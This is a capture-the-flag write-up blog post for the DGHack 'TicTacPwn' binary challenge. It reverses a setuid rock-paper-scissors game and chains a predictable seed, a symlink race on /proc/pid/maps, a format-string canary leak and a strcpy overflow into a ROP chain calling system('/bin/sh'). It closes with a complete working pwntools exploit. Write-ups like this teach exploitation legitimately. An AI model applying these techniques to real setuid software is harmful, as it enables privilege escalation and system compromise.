---
author: micronoyau
layout: post
date: 2023-12-05 12:00:00 +0200
tags: pwn dghack
title: "TicTacPwn"
excerpt_separator: <!--more-->
---

In this challenge, we are given a binary rock-paper-scissors game. I think this challenge is a good way to put in practice almost all basic techniques for binary exploitation on a non-trivial binary with all protections enabled.

## First execution

```
micronoyau@fedora  ~/Documents/ctfs/dghack/tictacpwn  ./tictacpwn 
Welcome to our card game !
Do you want to load a custom card for rock ? (y/n)
```

We are asked if we want to provide a custom card for the 'rock' card. As will be seen later, the expected format is a file with 16 lines and a maximum number of characters per line equal to 16. For now, let's use a 16x16 block of `a`.

```
Do you want to load a custom card for rock ? (y/n) y
Give me the path to the custom card:rock
Checking custom card...
Successfuly loaded card !
Rock - Paper - Scissors
What do you pick ?
1. Rock
2. Paper
3. Scissors
```

Let's chose rock to see our custom card :

```
1
You chose rock !
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
You win!
Rock - Paper - Scissors
What do you pick ?
1. Rock
2. Paper
3. Scissors
2
You chose paper !

     _______
---'    ____)____
           ______)
          _______)
         _______)
---.__________)
Bot wins!
Rock - Paper - Scissors
What do you pick ?
1. Rock
2. Paper
3. Scissors
```

The match is in 3 rounds. Upon losing, we are presented with the following message :

```
Bot wins!
You chose to exit. Bye!
```

However, winning allows us to write the byte of our choice at the address of our choice... Most likely we're going to need that later.

```
Good job on your win !
You're now allowed to write 8 bytes wherever you want !
Where do you want to write ?
> 0
What do you want to write ?
> 1 
[1]    38363 segmentation fault (core dumped)  ./tictacpwn
```

## Reversing the binary

Using ghidra, we can understand the logic of the game. Here are the most interesting parts of the program :

```
int main(void) {
  int user_choice;
  int bot_choice;
  long in_FS_OFFSET;
  char exit_message [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  welcome();
  do {
    USER_SCORE = 0;
    BOT_SCORE = 0;
    while ((USER_SCORE != 2 && (BOT_SCORE != 2))) {
      user_choice = menu();
      bot_choice = rand();
      if (user_choice == 3) {
        puts("You chose scissors !");
        scissors();
      }
      else if (user_choice < 4) {
        if (user_choice == 1) {
          puts("You chose rock !");
          rock();
        }
        else {
          if (user_choice != 2) goto LAB_00101882;
          puts("You chose paper !");
          paper();
        }
      }
      else {
LAB_00101882:
        puts("Wrong choice !");
        quit();
      }
      check(user_choice,bot_choice % 3 + 1);
    }
    strcpy(exit_message,EXIT_MESSAGE);
    if (USER_SCORE < 2) {
      printf(exit_message);
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    printf(WIN_MESSAGE);
    win();
    puts("And now you can play again !");
    srand(SEED);
  } while( true );
}

void setup(void){
  time_t t;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setuid(0);
  t = time((time_t *)0x0);
  srand((uint)t);
  SEED = rand();
  srand(SEED);
  return;
}


void rock(void){
  long lVar1;
  FILE *__stream;
  char *res;
  long in_FS_OFFSET;
  int i;
  char buf [256];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (CUSTOM_CARD_FILE == '\0') {
    puts("\n    _______\n---\'   ____)\n      (_____)\n      (_____)\n      (____)\n---.__(___)");
  }
  else {
    __stream = fopen(&CUSTOM_CARD_FILE,"r");
    i = 0;
    while( true ) {
      res = fgets(buf,0x100,__stream);
      if ((res == (char *)0x0) || (0xf < i)) break;
      printf("%s",buf);
      i = i + 1;
    }
    fclose(__stream);
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void win(void){
  long in_FS_OFFSET;
  undefined8 *user_addr;
  undefined8 content;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("You\'re now allowed to write 8 bytes wherever you want !");
  printf("Where do you want to write ?\n> ");
  __isoc99_scanf(&DAT_001020b8,&user_addr);
  printf("What do you want to write ?\n> ");
  __isoc99_scanf(&DAT_001020b8,&content);
  *user_addr = content;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void load_custom_card(void){
  int c;
  size_t filename_length;
  FILE *__stream;
  int lines;
  int max_columns;
  int columns;
  
  printf("Give me the path to the custom card:");
  fgets(&CUSTOM_CARD_FILE,0x40,stdin);
  filename_length = strlen(&CUSTOM_CARD_FILE);
  (&DAT_0010411f)[filename_length] = 0;
  puts("Checking custom card...");
  __stream = fopen(&CUSTOM_CARD_FILE,"r");
  if (__stream == (FILE *)0x0) {
    perror("File doesn\'t exists.");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  lines = 0;
  max_columns = 0;
  columns = 0;
  while( true ) {
    c = fgetc(__stream);
    if ((char)c == -1) break;
    if ((char)c == '\n') {
      lines = lines + 1;
      if (max_columns < columns) {
        max_columns = columns;
      }
      columns = 0;
    }
    else {
      columns = columns + 1;
    }
  }
  if (max_columns < columns) {
    max_columns = columns;
  }
  fclose(__stream);
  if ((lines == 0x10) && (max_columns == 0x10)) {
    puts("Successfuly loaded card !");
  }
  else {
    puts("Couldn\'t load card !");
    _CUSTOM_CARD_FILE = 0;
    uRam0000000000104124 = 0;
    uRam0000000000104128 = 0;
    uRam000000000010412c = 0;
    _DAT_00104130 = 0;
    uRam0000000000104134 = 0;
    uRam0000000000104138 = 0;
    uRam000000000010413c = 0;
    _DAT_00104140 = 0;
    uRam0000000000104144 = 0;
    uRam0000000000104148 = 0;
    uRam000000000010414c = 0;
    _DAT_00104150 = 0;
    uRam0000000000104154 = 0;
    uRam0000000000104158 = 0;
    uRam000000000010415c = 0;
  }
  return;
}
```

A few interesting points :
 + The seed is indeed initialized randomly (in `setup`), but since srand is called every time at the end of the loop, the same sequence is drawed again and again. So if we can win once, we can win every time. Moreover, by since the seed is simply the time at which we launch the binary (precise up to a second), we can compute the seed.
 + The verification for the rock card is done only at the beginning (in `load_custom_card`, not displayed above), but the file is opened again every time we select rock. This enables us to display at most 16 lines of every file on the system (since the SUID bit is set).
 + Pay attention to the line `strcpy(exit_message,EXIT_MESSAGE);` in `main`. No size check whatsoever => We can perform a buffer overflow.
 + Similarly, look closely at the line `printf(WIN_MESSAGE);` in `main`. An obvious format string vulnerability if we are able to control `WIN_MESSAGE` in `.data`.

## Bypassing the protections

Now, here's the tough part. All usual protections are enabled : ASLR, Canary, NX, Fortify RelRO...

```
 micronoyau@fedora  ~/Documents/ctfs/dghack/tictacpwn  checksec --file=tictacpwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   60 Symbols        No    0               3               tictacpwn
```

### ASLR bypass

In particular, bypassing ASLR requires to extract the base address of the segments loaded in memory. If only we had access to the virtual mappings of the process... But wait, we can exploit the fact that the rock file is checked only once ! After the verification, we can put a symlink to `/proc/[pid]/maps` and then select `rock` to dump the mappings.

### Dumping the canary

The second protection we need to take care of before performing our buffer overflow is the stack canary. To do so, let's exploit the format string vulnerability. Looking at the stack frame of `main` gives us the correct offset needed for our exploit :

```
                 int main()
 undefined         AL:1           <RETURN>
 undefined4        EAX:4          user_choice
 undefined4        EAX:4          bot_choice
 undefined8        Stack[-0x10]:8 canary
 undefined1[40]    Stack[-0x38]  exit_message
 undefined4        Stack[-0x3c]:4 local_3c
 undefined4        Stack[-0x40]:4 local_40
 undefined4        Stack[-0x44]:4 local_44
```

So when calling `printf`, we need to skip `(0x44-0x10)/8 = 6` values on the stack, plus the `6` registers `rdi, rsi, rdx, rcx, r8, r9`. So the canary is the `13`th argument of `printf`. We therefore need to write `%13$p` in `WIN_MESSAGE`.

### NX bypass

Ok, how do we get a shell now ? Since the stack is non executable, the most straightforward way is to perform a return to libc by overwriting the saved return address of `main` to be the address of `system`. Finding the address of `system` is easy now since we have the memory mappings. But in the 64 bit system V ABI, we need to pass parameters through registers, which is slightly more painful difficult than passing it through the stack.

In order to do this, I performed a ROP chain using ROP gadgets taken from the libc (the binary contains too few gadgets).

### Final stack layout

Here is the final layout of the stack for our exploit :

```
 _______________________
|        @system        |
 -----------------------
|      @'/bin/sh'       |
 -----------------------
| @gadget pop rdi ; ret |
 -----------------------
|       @gadget ret     | <--- Former saved IP (alignment issues, only if align=True)
 -----------------------
|          [junk]       | <--- Former saved BP
 -----------------------
|      stack canary     |
 -----------------------  ==> RBP-0x8
|          [junk]       |
 -----------------------  ==> RBP-0x10
|          [junk]       |
 -----------------------  ==> RBP-0x18
|          [junk]       |
 -----------------------  ==> RBP-0x20
|          [junk]       |
 -----------------------  ==> RBP-0x28
|       '/bin/sh\x00'   |
 -----------------------  ==> RBP-0x30
Total : 8 * 10 = 80 bytes (10 qwords)
```

Just a side note, to explain the presence of the trivial `ret` gadget : some functions of the `libc` require the stack to be `16`-byte aligned. See [this article](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465.) for more explanations.

## The final exploit

```
from pwn import *
import os
from ctypes import CDLL
from time import sleep

context.terminal = 'gnome-terminal'

libc = CDLL("libc.so.6")

FILENAME = './tictacpwn'

class RPSHandler:
    # On debian docker and remote
    OFFSET_SYSTEM_LIBC = 0x4c3a0 - 0x26000
    # On local machine
    # OFFSET_SYSTEM_LIBC = 168912
    # On debian docker and remote
    OFFSET_GADGET_LIBC = 0x0000000000027765 - 0x26000
    # On local machine
    # OFFSET_GADGET_LIBC = 872989 # Offset of "pop rdi ; ret" in segment
    OFFSET_WIN_MESSAGE_DATA = 0x40
    OFFSET_EXIT_MESSAGE_DATA = 0x20
    PADDING_LEN = 0x20

    def __init__(self, remote=None, debug=False):
        self.debug = debug
        self.elf = ELF(FILENAME)
        self.remote = True if remote else False

        if remote:
            s = ssh(host=remote[0],
                    user='user',
                    password='user',
                    port=remote[1])
            self.p = s.process('/challenge/tictacpwn')
        else:
            self.p = process(FILENAME)

        libc.srand(libc.time(0))
        self.seed = libc.rand()
        self.reseed()

        self.winning_seq = []
        for i in range(3):
            self.winning_seq.append(((libc.rand() % 3) + 1) % 3 + 1)

    def reseed(self):
        libc.srand(self.seed)

    def consume_all(self):
        res = self.p.recv()
        print(res)
        return res

    def full_round(self):
        for i in range(2):
            self.p.sendline(str(self.winning_seq[i]).encode())
            sleep(1)
            res = self.consume_all()
        return res

    def write_memory(self, addr, content):
        self.p.sendline(hex(addr).encode())
        self.consume_all()
        self.p.sendline(hex(int.from_bytes(content[::-1])).encode())

    def read_mappings(self):
        self.consume_all()
        self.p.sendline(b'y') # Load "test"
        self.consume_all()

        self.p.sendline(b'card')
        sleep(1)
        self.consume_all()

        # User does a symlink
        input("Changed card to symlink to memory mapping ? PID = {}".format(self.p.pid))

        # Send rock to see memory mapping
        self.p.sendline(b'1')
        sleep(1)
        mapping = self.consume_all().decode()

        # Virtual address of segment containing .data
        self.DATA_BASE_ADDR = int(mapping.split('\n')[5].split('-')[0], base=16)
        # Virtual address of segment containing libc's .text
        self.LIBC_BASE_ADDR = int(mapping.split('\n')[9].split('-')[0], base=16)

        print("\n[+] Segment containing .data mapped address : 0x{:08x}\n".format(self.DATA_BASE_ADDR))
        print("\n[+] Segment containing libc's .text mapped address : 0x{:08x}\n".format(self.LIBC_BASE_ADDR))

        winner = mapping.split('\n')[17]

        self.p.sendline(str(self.winning_seq[1]).encode())

        # Win twice if needed
        if winner == 'Bot wins!' or winner == 'It\'s a draw!':
            self.p.sendline(str(self.winning_seq[2]).encode())

        self.consume_all().decode()

    def find_canary(self):
        self.write_memory(self.DATA_BASE_ADDR + RPSHandler.OFFSET_WIN_MESSAGE_DATA, b'%13$p\n\x00')

        self.consume_all()

        # Win again to see message and grab canary
        res = self.full_round().decode()
        self.CANARY = int(res.split('\n')[-4], base=16)
        print("\n[+] Found canary = 0x{:08x}\n".format(self.CANARY))

    def overwrite_return_addr(self, align=False):
        # Overview of memory :
        #  _______________________
        # |        @system        |
        #  -----------------------
        # |      @'/bin/sh'       |
        #  -----------------------
        # | @gadget pop rdi ; ret |
        #  -----------------------
        # |       @gadget ret     | <--- Former saved IP (alignment issues, only if align=True)
        #  -----------------------
        # |          [junk]       | <--- Former saved BP
        #  -----------------------
        # |      stack canary     |
        #  -----------------------  ==> RBP-0x8
        # |          [junk]       |
        #  -----------------------  ==> RBP-0x10
        # |          [junk]       |
        #  -----------------------  ==> RBP-0x18
        # |          [junk]       |
        #  -----------------------  ==> RBP-0x20
        # |          [junk]       |
        #  -----------------------  ==> RBP-0x28
        # |       '/bin/sh\x00'   |
        #  -----------------------  ==> RBP-0x30
        # Total : 8 * 10 = 80 bytes (10 qwords)

        # First write only non-null bytes to set arg for system,
        # overwrite return address, followed by stack canary
        for i in range(10):
            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                              + 8*i,
                              b'aaaaaaaa')
            print("*** FILLED at padding {} ***".format(i))
            self.full_round()

        # For the following addresses : these addresses fit on 6 bytes.
        # The 7th is null and is well copied to the stack
        # But the 8th one is omitted by strcpy (because strcpy stops before)
        # Se we need to write a null byte at the of the address beforehand

        # Write last null byte of @system
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*9+7 + (8 if align else 0),
                          b'\x00')
        print("*** WROTE last null byte of @system ***")
        self.full_round()

        # Write @system
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*9 + (8 if align else 0),
                          bytes.fromhex("{:08x}".format(
                              self.LIBC_BASE_ADDR
                              + RPSHandler.OFFSET_SYSTEM_LIBC))[::-1])
        print("*** WROTE @system ***")
        self.full_round()

        # Write last null byte of @'bin/sh'
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*8+7 + (8 if align else 0),
                          b'\x00')
        print("*** WROTE last null byte of @'/bin/sh' ***")
        self.full_round()

        # Write @'/bin/sh' ===> simply exit_message
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*8 + (8 if align else 0),
                          bytes.fromhex("{:08x}".format(
                              self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA))[::-1])
        print("*** WROTE @'/bin/sh' ***")
        self.full_round()


        # Write last null byte of @gadget
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*7+7 + (8 if align else 0),
                          b'\x00')
        print("*** WROTE last null byte of @gadget ***")
        self.full_round()

        # Write @gadget
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*7 + (8 if align else 0),
                          bytes.fromhex("{:08x}".format(
                              self.LIBC_BASE_ADDR
                              + RPSHandler.OFFSET_GADGET_LIBC))[::-1])
        print("*** WROTE @gadget ***")
        self.full_round()

        if align:
            # Write last null byte of @dummy gadget (@gadget + 1)
            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                              + 8*7+7,
                              b'\x00')
            print("*** WROTE last null byte of @dummy gadget ***")
            self.full_round()

            # Write @dummy gadget (@gadget + 1)
            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                              + 8*7,
                              bytes.fromhex("{:08x}".format(
                                  self.LIBC_BASE_ADDR
                                  + RPSHandler.OFFSET_GADGET_LIBC + 1))[::-1])
            print("*** WROTE @dummy gadget ***")
            self.full_round()

        # Write stack canary
        # Do not write first byte because it is null
        # and would not be copied by strcpy
        # Instrad write canary+1 and then 0x00

        # Step 1 : canary+1
        print("{:08x}".format(self.CANARY+1))
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*5,
                          bytes.fromhex("{:08x}".format(self.CANARY+1))[::-1])
        print("*** WROTE canary + 1 ***")
        self.full_round()

        # Step 2 : null byte for first canary byte
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                          + 8*5,
                          b'\x00')
        print("*** WROTE canary null byte ***")
        self.full_round()

        #if self.remote:
        if False:
            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA,
                              b'/readfla')
            print("*** WROTE /readfla ***")
            self.full_round()

            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA
                              + 8,
                              b'g\x00')
            print("*** WROTE g 0x00 ***")
            self.full_round()

        else:
            # Write /bin/sh\x00
            self.write_memory(self.DATA_BASE_ADDR
                              + RPSHandler.OFFSET_EXIT_MESSAGE_DATA,
                              b'/bin/sh\x00')
            print("*** WROTE /bin/sh ***")
            self.full_round()

        # Last write at random place so that we indeed write null byte (needed only for debugging)
        self.write_memory(self.DATA_BASE_ADDR
                          + RPSHandler.OFFSET_EXIT_MESSAGE_DATA + 16,
                          b'aaaaaaaa')

        if (self.debug):
            input("Attached to debugger?")

        self.p.sendline(str((self.winning_seq[0])%3+1).encode())
        self.consume_all()
        self.p.sendline(str((self.winning_seq[1])%3+1).encode())
        self.consume_all()

        self.p.interactive()

rpshandler = RPSHandler(remote=('ssh-hq2qlw.inst.malicecyber.com', 4096), debug=False)
rpshandler.read_mappings()
rpshandler.find_canary()
rpshandler.overwrite_return_addr(align=True)
```
